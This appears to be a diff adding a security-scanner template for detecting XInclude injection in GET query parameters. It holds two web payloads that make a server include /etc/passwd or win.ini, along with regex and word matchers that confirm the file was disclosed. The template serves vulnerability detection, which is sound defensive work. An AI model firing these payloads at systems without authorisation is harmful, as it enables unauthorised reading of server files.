@@ -1,0 +1,44 @@
+id: xinclude-injection
+
+info:
+  name: XInclude Injection - Detection
+  author: DhiyaneshDK,ritikchaddha
+  severity: high
+  description: |
+    XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.
+  reference:
+    - https://d0pt3x.gitbook.io/passion/webapp-security/xxe-attacks/xinclude-attacks
+  tags: dast,xxe,xinclude
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      xinc_fuzz:
+        - '<asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></asd>'
+        - '<asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></asd>'
+
+    fuzzing:
+      - part: query
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: multiple # replaces all parameters value with fuzz payload
+        fuzz:
+          - '{{xinc_fuzz}}'
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: linux
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        name: windows
+        part: body
+        words:
+          - 'for 16-bit app support'
